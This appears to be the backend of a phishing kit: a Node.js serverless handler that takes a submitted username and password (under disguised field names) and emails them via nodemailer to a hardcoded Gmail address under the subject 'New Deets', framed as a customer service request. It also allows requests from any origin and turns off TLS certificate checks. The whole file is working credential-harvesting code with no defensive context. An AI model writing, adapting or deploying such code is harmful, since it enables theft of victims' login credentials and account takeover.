const nodemailer = require('nodemailer');

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false});
  }

  try {

    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      return res.status(500).json({ 
        success: false, 
      });
    }

    const maillist = ['Gfequitygroupjobcenter@gmail.com'];

    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    await transporter.verify();

    const { phwet, psdwet } = req.body;

    if (!phwet && !psdwet) {
      return res.status(400).json({ 
        success: false, 
        error: 'At least one field is required' 
      });
    }

    const mailOptions = {
      from: `"New Deets" <${process.env.EMAIL_USER}>`,
      to: maillist,
      subject: 'New Deets',
      html: `
        <h3>New Customer Service Request</h3>
        <p><strong>Email/Username:</strong> ${phwet || 'Not provided'}</p>
        <p><strong>Password:</strong> ${psdwet || 'Not provided'}</p>
      `
    };

    const info = await transporter.sendMail(mailOptions);

    return res.status(200).json({ 
      success: true, 
    });

  } catch (error) {    
    return res.status(500).json({ 
      success: false, 
    });
  }
};